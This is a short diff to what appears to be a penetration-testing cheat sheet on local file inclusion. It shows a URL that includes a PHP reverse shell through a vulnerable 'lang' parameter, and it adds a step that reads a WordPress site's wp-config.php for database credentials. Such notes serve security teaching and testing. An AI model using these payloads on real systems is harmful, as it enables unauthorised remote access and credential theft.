@@ -91,3 +91,9 @@ You might detect something like
 ### 3) Enjoy your shell
 
     http://domain.local/vulnerable.php?lang=/var/ftp/pub/php-reverse-shell.php
+
+## LFI an a WordPress application
+
+If we detect a Wordpress application that has LFI vulnerability, we can extract the application's wp-config.php for credentials.
+
+    /var/www/html/wp-config.php
